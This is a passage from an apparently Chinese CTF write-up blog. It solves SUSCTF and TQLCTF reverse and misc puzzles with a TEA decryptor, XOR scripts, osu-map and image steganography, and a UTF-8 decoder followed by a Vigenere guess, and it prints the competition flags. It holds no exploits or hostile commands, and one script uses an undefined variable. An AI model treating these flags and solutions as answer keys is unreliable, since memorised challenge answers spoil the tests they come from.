class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;  </span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;  </span></span><br><span class="line">  </span><br><span class="line">//加密函数  </span><br><span class="line">void encrypt (uint32_t* v, uint32_t* k) &#123;  </span><br><span class="line">    uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], <span class="built_in">sum</span>=<span class="number">0</span>, i;           /* <span class="built_in">set</span> up */  </span><br><span class="line">    uint32_t delta=<span class="number">0x9e3779b9</span>;                     /* a key schedule constant */  </span><br><span class="line">    uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   /* cache key */  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       /* basic cycle start */  </span><br><span class="line">        <span class="built_in">sum</span> += delta;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + <span class="built_in">sum</span>) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + <span class="built_in">sum</span>) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              /* end cycle */  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">//解密函数  </span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;  </span><br><span class="line">    uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], <span class="built_in">sum</span>=<span class="number">0xC6EF3720</span>, i;  /* <span class="built_in">set</span> up */  </span><br><span class="line">    uint32_t delta=<span class="number">0x9e3779b9</span>;                     /* a key schedule constant */  </span><br><span class="line">    uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   /* cache key */  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         /* basic cycle start */  </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + <span class="built_in">sum</span>) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + <span class="built_in">sum</span>) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        <span class="built_in">sum</span> -= delta;  </span><br><span class="line">    &#125;                                              /* end cycle */  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">int</span> main()  </span><br><span class="line">&#123;  </span><br><span class="line">    uint32_t v[<span class="number">6</span>]=&#123;<span class="number">1049184203</span>, <span class="number">3432269369</span>, <span class="number">825590664</span>, <span class="number">990603411</span>, <span class="number">3663885153</span>, <span class="number">992896039</span>&#125;, k[<span class="number">4</span>]=&#123;<span class="number">17477</span>, <span class="number">16708</span>, <span class="number">16965</span>, <span class="number">17734</span>&#125;;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        decrypt((uint32_t*)&amp;v + i, k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        printf(<span class="string">&quot;%08x&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022SUSCTF/image-20220302092314378.png"></p><p>然后unhex一下：</p><p><img src="/p/wpFor-2022SUSCTF/image-20220302092327763.png"></p><p>flag：<strong>SUSCTF{XBvfaEdQvbcrxPBh8AOcJ6gA}</strong></p><h2 id="hell-world"><a href="#hell-world" class="headerlink" title="hell_world"></a>hell_world</h2><p>在某g搜“vhdl 逆向”的时候搜到一道类似的题：<a href="https://team-su.github.io/passages/2021-11-20-XHLJ/">https://team-su.github.io/passages/2021-11-20-XHLJ/</a></p><p>思路跟这个题差不多（可以说除了数据、case和算法其他都是一样的，连2233都一样），xjb逆+动态调试就行</p><p>搜字符串“flag”，定位到一样的主操作函数</p><p>最开始的已知数组在dword_7FF74A635C50</p><p><img src="/p/wpFor-2022SUSCTF/image-20220302092540041.png"></p><p><img src="/p/wpFor-2022SUSCTF/image-20220302092553401.png"></p><p>case11这里有另一个已知数组</p><p><img src="/p/wpFor-2022SUSCTF/image-20220302092604546.png"></p><p>然后把两个已知数组前面几个相互xor起来会发现刚好是SUS。。</p><p>然后就出来了（</p><p>（如果不确定是xor的话也可以通过动态调试看输出来判断，比较的加密后的密文在case7这里）</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr1 = [<span class="number">0x00000056</span>, <span class="number">0x000000DA</span>, <span class="number">0x000000CD</span>, <span class="number">0x0000003A</span>, <span class="number">0x0000007E</span>, <span class="number">0x00000086</span>, <span class="number">0x00000013</span>, <span class="number">0x000000B5</span>, <span class="number">0x0000001D</span>, <span class="number">0x0000009D</span>, <span class="number">0x000000FC</span>, <span class="number">0x00000097</span>, <span class="number">0x0000008C</span>, <span class="number">0x00000031</span>, <span class="number">0x0000006B</span>, <span class="number">0x000000C9</span>, <span class="number">0x000000FB</span>, <span class="number">0x0000001A</span>, <span class="number">0x000000E2</span>, <span class="number">0x0000002D</span>, <span class="number">0x000000DC</span>, <span class="number">0x000000D3</span>, <span class="number">0x000000F1</span>, <span class="number">0x000000F4</span>, <span class="number">0x00000036</span>, <span class="number">0x00000009</span>, <span class="number">0x00000020</span>, <span class="number">0x00000042</span>, <span class="number">0x00000004</span>, <span class="number">0x0000006A</span>, <span class="number">0x00000071</span>, <span class="number">0x00000053</span>, <span class="number">0x00000078</span>, <span class="number">0x000000A4</span>, <span class="number">0x00000097</span>, <span class="number">0x0000008F</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000072</span>, <span class="number">0x00000039</span>, <span class="number">0x000000E8</span>, <span class="number">0x0000003D</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003D</span>]</span><br><span class="line">arr2 = [<span class="number">0x00000005</span>, <span class="number">0x0000008F</span>, <span class="number">0x0000009E</span>, <span class="number">0x00000079</span>, <span class="number">0x0000002A</span>, <span class="number">0x000000C0</span>, <span class="number">0x00000068</span>, <span class="number">0x00000081</span>, <span class="number">0x0000002D</span>, <span class="number">0x000000FC</span>, <span class="number">0x000000CF</span>, <span class="number">0x000000A4</span>, <span class="number">0x000000B5</span>, <span class="number">0x00000055</span>, <span class="number">0x0000005F</span>, <span class="number">0x000000E4</span>, <span class="number">0x0000009D</span>, <span class="number">0x00000023</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000001D</span>, <span class="number">0x000000F1</span>, <span class="number">0x000000E7</span>, <span class="number">0x00000097</span>, <span class="number">0x00000091</span>, <span class="number">0x00000006</span>, <span class="number">0x00000024</span>, <span class="number">0x00000042</span>, <span class="number">0x00000071</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000058</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000030</span>, <span class="number">0x00000019</span>, <span class="number">0x000000C6</span>, <span class="number">0x000000F5</span>, <span class="number">0x000000BC</span>, <span class="number">0x0000004B</span>, <span class="number">0x00000042</span>, <span class="number">0x0000005D</span>, <span class="number">0x000000DA</span>, <span class="number">0x00000058</span>, <span class="number">0x0000009B</span>, <span class="number">0x00000024</span>, <span class="number">0x00000040</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(arr1[i] ^ arr2[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022SUSCTF/image-20220301003721381.png"></p><p>flag：<strong>SUSCTF{40a339d4-f940-4fe0-b382-cabb310d2ead}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2022TQLCTF</title>
      <link href="p/wpFor-2022TQLCTF/"/>
      <url>p/wpFor-2022TQLCTF/</url>
      
        <content type="html"><![CDATA[<p>前天打完的TQLCTF，来总结一下自己独立输出的几个题（可能会有其他题的复现？咕咕咕了x</p><p>队友们tqltql！有被带飞到！</p><a id="more"></a><p><img src="/p/wpFor-2022TQLCTF/image-20220223090615359.png"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Tales-of-the-Arrow"><a href="#Tales-of-the-Arrow" class="headerlink" title="Tales of the Arrow"></a>Tales of the Arrow</h2><p>代码比较短，但是全是一堆randint</p><p>题目中并没有用到seed，同一份加密代码跑两遍出来的<code>output.txt</code>肯定也是不一样的，所以肯定不是随机数预测，所以就找漏洞（偏Crypto的思维了hhh</p><p>题目给的<code>gen.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Enter the text within tqlctf&#123; ... &#125;:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">input</span>();</span><br><span class="line"></span><br><span class="line">id_bytes = <span class="built_in">bytes</span>(<span class="built_in">id</span>, <span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">bits = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&quot;&#123;0:08b&#125;&quot;</span>.<span class="built_in">format</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> id_bytes])</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(bits)</span><br><span class="line"></span><br><span class="line">N = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_lit</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (i+<span class="number">1</span>) * (<span class="number">2</span>*<span class="built_in">int</span>(bits[i])<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    i = random.randint(<span class="number">0</span>,n<span class="number">-1</span>)</span><br><span class="line">    p = random.randint(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    true_lit = get_lit(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> j == p:</span><br><span class="line">            print(true_lit)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = random.randint(<span class="number">0</span>,n<span class="number">-1</span>)</span><br><span class="line">            rand_true = get_lit(tmp)</span><br><span class="line">            <span class="keyword">if</span> random.randint(<span class="number">0</span>,<span class="number">3</span>)==<span class="number">0</span>:</span><br><span class="line">                print(rand_true)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(-rand_true)</span><br></pre></td></tr></table></figure><p>可以看到get_lit实际上就是返回一个数，<code>get_lit(i)</code>的返回值&gt;0说明第i位是1，&lt;0说明第i位是0，返回值一定为<code>-(i+1)</code>或<code>i+1</code>。</p><p>在主函数代码中，<code>true_lit</code>（$\frac{1}{3}$概率）和<code>rand_true</code>（$\frac{2}{3} \cdot \frac{1}{4}$概率）都会输出真实的get_lit，而<code>-rand_true</code>（$\frac{2}{3} \cdot \frac{3}{4}$概率）输出的是相反的get_lit。</p><p>就是说只要输出<code>-rand_true</code>就说明在这一组（三个数一组）中<code>j!=p</code>，而每一组中必然有一个<code>j==p</code>和两个<code>j!=p</code>，所以只要这一组里有两个<code>-rand_true</code>那剩下的数一定就是<code>true_lit</code>。</p><p>理论有了，现在需要一个切入点。从<code>id_bytes = bytes(id, &quot;ascii&quot;)</code>可以知道id为ASCII字符，并且通过<code>input()</code>输入大概率是可见的，那最高bit肯定是0（也就是每个字符的二进制必然是0???????），而这个就是切入点。</p><p>然后就能写出exp（<code>while True</code>里每一轮根据上一轮的已知结果来推，无脑循环；算法菜没优化，但速度出乎意料地快）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(data[<span class="number">0</span>])</span><br><span class="line">N = <span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, data[<span class="number">2</span>:<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line">bits = [<span class="string">&#x27;_&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">        bits[i] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, N * <span class="number">3</span>, <span class="number">3</span>): <span class="comment"># 三个一组</span></span><br><span class="line">        neg = <span class="built_in">list</span>(<span class="string">&#x27;+++&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment"># 检测-rand_true，是则将neg置为&#x27;-&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> data[i+j] &gt; <span class="number">0</span> <span class="keyword">and</span> bits[data[i+j]<span class="number">-1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                neg[j] = <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> data[i+j] &lt; <span class="number">0</span> <span class="keyword">and</span> bits[-data[i+j]<span class="number">-1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                neg[j] = <span class="string">&#x27;-&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.join(neg).count(<span class="string">&#x27;-&#x27;</span>) == <span class="number">2</span>: <span class="comment"># 如果有两个-rand_true，那剩下的位即可确定</span></span><br><span class="line">            idx = data[i+<span class="string">&#x27;&#x27;</span>.join(neg).find(<span class="string">&#x27;+&#x27;</span>)]</span><br><span class="line">            <span class="keyword">if</span> idx &lt; <span class="number">0</span>:</span><br><span class="line">                idx = -idx - <span class="number">1</span></span><br><span class="line">                bits[idx] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> idx &gt; <span class="number">0</span>:</span><br><span class="line">                idx -= <span class="number">1</span></span><br><span class="line">                bits[idx] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.join(bits).find(<span class="string">&#x27;_&#x27;</span>) == <span class="number">-1</span>: <span class="comment">#如果所有bits都确定了就退出</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># print(&#x27;&#x27;.join(bits))</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n, <span class="number">8</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(bits[i:i+<span class="number">8</span>]), <span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022TQLCTF/image-20220223093532330.png"></p><p><strong>tqlctf{see_you_in_galaxy}</strong></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="the-Ohio-State-University"><a href="#the-Ohio-State-University" class="headerlink" title="the Ohio State University"></a>the Ohio State University</h2><p>下载附件看到是osz，音游人狂喜了属于是（</p><p>根据常识，出题人不可能为了出道题去写一张谱，所以跑去osu官网用歌名下到原谱面</p><p><img src="/p/wpFor-2022TQLCTF/image-20220221160559599.png"></p><p>然后对比了一下两个谱面文件的差异文件，可以看到题目中只有四个文件的修改时间是有变化的</p><p><img src="/p/wpFor-2022TQLCTF/image-20220221160833675.png"></p><p><img src="/p/wpFor-2022TQLCTF/image-20220221160905052.png"></p><p>所以从这四个文件下手，用010对比看修改了什么。</p><p>在BASIC谱面中多了一行WAVPassword: MisoilePunch，刚好有个<code>boom.wav</code>是被出题人改过的，所以猜测是用来解密这个wav的密码。</p><p><img src="/p/wpFor-2022TQLCTF/image-20220221161059340.png"></p><p>换了几个工具最后找到了SlientEye，解出flag的中间段：**<code>_TO_O$u_i7s_</code>**</p><p><img src="/p/wpFor-2022TQLCTF/image-20220221184050069.png"></p><p>然后VIVID是谱面有改动</p><p><img src="/p/wpFor-2022TQLCTF/image-20220221184330575.png"></p><p>osu打开谱面编辑可以看到从111533时间戳开始，相同两行会重复四次，而两行四个位置加起来就是8，有note的位置为1没有note的位置为0就是一个字节。</p><p><img src="/p/wpFor-2022TQLCTF/6.png" alt="test6"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;MisoilePunch - VVelcome!! (Fresh Chicken) [VIVID].osu&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">idx_start = data.index(<span class="string">&#x27;320,192,111533,1,0,0:0:0:0:&#x27;</span>)</span><br><span class="line">idx_end = data.index(<span class="string">&#x27;448,192,115551,1,0,0:0:0:0:&#x27;</span>)</span><br><span class="line">data = data[idx_start:idx_end+<span class="number">1</span>]</span><br><span class="line">notes = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    matchObj = re.search(<span class="string">r&#x27;(\d+),\d+,(\d+)&#x27;</span>, data[i])</span><br><span class="line">    <span class="keyword">if</span> matchObj.group(<span class="number">2</span>) <span class="keyword">not</span> <span class="keyword">in</span> notes.keys():</span><br><span class="line">        notes.update(&#123;matchObj.group(<span class="number">2</span>): [matchObj.group(<span class="number">1</span>)]&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        notes[matchObj.group(<span class="number">2</span>)].append(matchObj.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">bits = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pos = [<span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;192&#x27;</span>, <span class="string">&#x27;320&#x27;</span>, <span class="string">&#x27;448&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> notes.keys():</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> pos:</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> notes[x]:</span><br><span class="line">            bits += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bits += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">print(bits)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(bits[i:i+<span class="number">8</span>]), <span class="number">2</span>)), end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以得到flag的后半部分：**<code>5HoWtIme&#125;</code>**</p><p><img src="/p/wpFor-2022TQLCTF/image-20220221184708171.png"></p><p>剩下不同的jpg文件应该是隐写了flag的最前部分，用exiftool可以看到有一个密码</p><p><img src="/p/wpFor-2022TQLCTF/image-20220221184921460.png"></p><p>然后在这里 （<a href="https://harvey.plus/2021/02/28/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF">CTF-图片隐写那些事儿 | Mssn Harvey</a>） 一个个工具试过来，用steghide可以解出flag的前半部分：**<code>TQLCTF&#123;VVElcOM3</code>**</p><p><img src="/p/wpFor-2022TQLCTF/7.png" alt="test7"></p><p><img src="/p/wpFor-2022TQLCTF/8.png" alt="test8"></p><p>flag：<strong>TQLCTF{VVElcOM3_TO_O$u_i7s_5HoWtIme}</strong></p><p>（学到了，之前想出osu的题但是懒得采音就作罢了，感谢出题人提供的全新思路）</p><h2 id="Ranma½"><a href="#Ranma½" class="headerlink" title="Ranma½"></a>Ranma½</h2><p>看起来符合utf8的编码逻辑，找到一篇现成代码<a href="https://blog.csdn.net/jimmy0021/article/details/104950547">Unicode和UTF-8关系及UTF-8编码规则及过滤Emoji表情</a>，把里面的java代码抄了一份python版出来，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag_4c7b25b7ade73ac3a6b3081c81633fe6&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    code = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (data[i] &amp; <span class="number">0x80</span>) == <span class="number">0x0</span>:</span><br><span class="line">        code = data[i]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> (data[i] &amp; <span class="number">0xE0</span>) == <span class="number">0xC0</span>:</span><br><span class="line">        code = ((data[i] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">6</span>) | (data[i+<span class="number">1</span>] &amp; <span class="number">0x3F</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> (data[i] &amp; <span class="number">0xF0</span>) == <span class="number">0xE0</span>:</span><br><span class="line">        code = (((data[i] &amp; <span class="number">0x0F</span>)) &lt;&lt; <span class="number">12</span>) | ((data[i + <span class="number">1</span>] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | (data[i + <span class="number">2</span>] &amp; <span class="number">0x3F</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> (data[i] &amp; <span class="number">0xF8</span>) == <span class="number">0xF0</span>:</span><br><span class="line">        code = ((t1[i] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">18</span>) | ((t1[i + <span class="number">1</span>] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">12</span>) | ((t1[i + <span class="number">2</span>] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | (t1[i + <span class="number">3</span>] &amp; <span class="number">0x3F</span>)</span><br><span class="line">        i += <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> code != <span class="number">0</span>:</span><br><span class="line">        s += <span class="built_in">chr</span>(code)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022TQLCTF/image-20220221155707656.png"></p><p>可以看到末尾有个HTTPZB和大括号，猜测这里原来应该是TQLCTF{}，原文两个T连一块那可以排除凯撒和简单一对一替换了，于是掏出陈年法宝来猜密钥未知的Vigenere</p><p><a href="https://atomcated.github.io/Vigenere/">https://atomcated.github.io/Vigenere/</a></p><p><img src="/p/wpFor-2022TQLCTF/5.png" alt="test5"></p><p>然后可以看到flag：<strong>TQLCTF{CODIN6_WOR1D}</strong></p><p>（所以跟日本那个同名漫画有什么关系呢，还看了好半天的wiki</p><h2 id="Cat-Soup"><a href="#Cat-Soup" class="headerlink" title="Cat&amp;Soup"></a>Cat&amp;Soup</h2><p><strong>是复现！</strong> 出题人wp在：<a href="https://nano.ac/posts/79c74adf/#Cat-amp-Soup">TQLCTF Official Writeup By Nano | Non-existent World</a>，感谢出题人Nano师傅给这个研究不太懂wp的菜鸡（指指自己）提供了一些思路点拨和脚本参考_(:з」∠)_</p><p>首先题目下载下来拿到的是一个加密压缩包，本来以为需要爆破弱密码，后来队友<a href="https://csomepro.github.io/">@CSOME</a> 发现压缩包数据里有完整的png头和尾，完全可以把图片提取出来。</p><p>提取脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td 